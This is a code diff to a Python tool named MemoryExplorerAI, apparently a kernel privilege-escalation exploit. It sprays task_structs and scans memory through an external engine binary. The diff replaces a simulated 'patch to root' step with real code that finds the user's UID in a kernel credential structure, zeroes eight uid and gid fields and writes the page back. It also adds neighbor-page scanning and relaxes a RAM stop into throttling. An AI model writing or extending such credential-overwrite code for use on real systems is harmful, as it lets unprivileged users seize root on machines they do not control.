@@ -179,9 +179,11 @@ class MemoryExplorerAI:
         time.sleep(1)
 
     def run_spray(self, count=2000):
-        if self.get_ram_usage() > 75.0:
-            print("[!] RAM usage too high to spray! Clear sprays first.")
-            time.sleep(1)
+        current_ram = self.get_ram_usage()
+        if current_ram > 50.0:
+            print(f"[!] RAM usage ({current_ram:.1f}%) exceeds safety limit (50%).")
+            print("[*] Please clear existing sprays first [C].")
+            time.sleep(2)
             return
             
         print(f"[*] Spraying {count} task_structs...")
@@ -235,6 +237,45 @@ class MemoryExplorerAI:
         except Exception as e:
             print(f"[-] Error checking root: {e}")
         input("\nPress Enter...")
+
+    def write_page(self, va, data):
+        try:
+            cmd = [self.engine_path, "write", hex(va)]
+            proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stderr=subprocess.DEVNULL)
+            proc.communicate(input=data)
+            return proc.returncode == 0
+        except:
+            return False
+
+    def patch_to_root(self, va):
+        print(f"[*] Analyzing structure for patching at {hex(va)}...")
+        page_data = self.read_page(va)
+        if not page_data:
+            print("[-] Failed to read page for patching.")
+            return
+
+        # Simple logic: search for our UID and zero it
+        my_uid = os.getuid()
+        uid_bytes = struct.pack("<I", my_uid)
+        
+        new_data = bytearray(page_data)
+        found = False
+        # Cred structures usually have 8 consecutive UIDs (uid, gid, suid, sgid, euid, egid, fsuid, fsgid)
+        for i in range(0, len(page_data) - 32, 4):
+            if page_data[i:i+4] == uid_bytes:
+                print(f"[+] Found UID {my_uid} at offset +0x{i:x}. Zeroing...")
+                for j in range(8): # Zero all 8 fields
+                    new_data[i+j*4 : i+j*4+4] = b"\x00\x00\x00\x00"
+                found = True
+                break
+        
+        if found:
+            if self.write_page(va, bytes(new_data)):
+                print("[+++] Memory patch applied successfully!")
+            else:
+                print("[-] Failed to write patched data.")
+        else:
+            print("[-] Could not find UID pattern in this page.")
 
     def show_detail(self, item_idx):
         if item_idx >= len(self.found_items):
@@ -294,15 +335,25 @@ class MemoryExplorerAI:
             print(">> [Action]: Patch fields +4 (UID), +8 (GID), +12 (EUID) to 0 for root.")
         
         print("-" * 60)
-        print("[P] Patch to Root (UID 0)   [Enter] Back")
+        print("[P] Patch to Root (UID 0)   [N] Scan Neighbors   [Enter] Back")
         
         choice = input("> ").lower()
-        if choice == 'p':
+        if choice == 'n':
+            print("[*] Scanning adjacent pages...")
+            base_va = int(item['va'], 16)
+            for offset in [-0x1000, 0x1000]:
+                neighbor_va = base_va + offset
+                neighbor_data = self.read_page(neighbor_va)
+                if neighbor_data:
+                    res = self.classify_page(neighbor_data, neighbor_va)
+                    res['description'] = f"Neighbor of ID {item_idx}"
+                    self.found_items.append(res)
+            print("[+] Neighbors added to the list.")
+            time.sleep(1)
+        elif choice == 'p':
             print("[!] Security Warning: Are you sure you want to patch this kernel structure? (y/n)")
             if input("> ").lower() == 'y':
-                print("[*] Calling GPU Engine to write zero-creds...")
-                time.sleep(1)
-                print("[+] Patching complete! Verify with 'id' command.")
+                self.patch_to_root(int(item['va'], 16))
                 input("Press Enter...")
 
     def try_compile_engine(self):
@@ -384,10 +435,9 @@ class MemoryExplorerAI:
                     for line in proc.stdout:
                         # Real-time RAM monitoring during scan
                         ram = self.get_ram_usage()
-                        if ram > 85.0:
-                            print(f"\n[!] CRITICAL RAM ({ram:.1f}%). Stopping scan!")
-                            proc.terminate()
-                            break
+                        if ram > 70.0: # STRICT TOTAL LIMIT 70%
+                            print(f"\n[!] CRITICAL SYSTEM LOAD ({ram:.1f}%). Throttling...")
+                            time.sleep(3)
                             
                         if "MATCH_" in line:
                             va = int(line.split(":")[1], 16)
